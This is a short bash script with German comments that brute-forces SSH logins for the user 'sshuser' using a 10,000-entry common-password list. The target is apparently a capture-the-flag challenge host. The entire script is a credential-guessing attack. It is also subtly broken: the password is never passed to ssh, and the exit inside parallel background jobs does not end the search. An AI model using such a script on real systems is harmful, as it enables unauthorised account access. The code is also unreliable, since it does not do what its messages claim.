#!/bin/bash

# Server-Adresse
server="server1.challenge-883ad57c-80e2-4f8f-92f4-e8c19d747341.svc.cluster.local"

# Benutzername
username="sshuser"

# Datei mit den 10.000 häufigsten Passwörtern
password_list="./10k-most-common.txt"

# SSH-Port
port=22

# Funktion, um das Passwort zu testen
check_password() {
    local password="$1"
    ssh -o StrictHostKeyChecking=no -p $port $username@$server "echo Anmeldung erfolgreich mit Passwort: $password && exit" >/dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo "Erfolgreich angemeldet als '$username' mit dem Passwort '$password'"
        echo "Passwort: $password" >> successful_passwords.txt
        exit 0
    else
        echo "Fehler beim Anmelden als '$username' mit dem Passwort '$password'"
        echo "Passwort: $password (Fehler)" >> unsuccessful_passwords.txt
    fi
}

# Überprüfen Sie jedes Passwort in der Liste
while IFS= read -r password; do
    check_password "$password" &
done < "$password_list"

wait

echo "Kein gültiges Passwort gefunden."
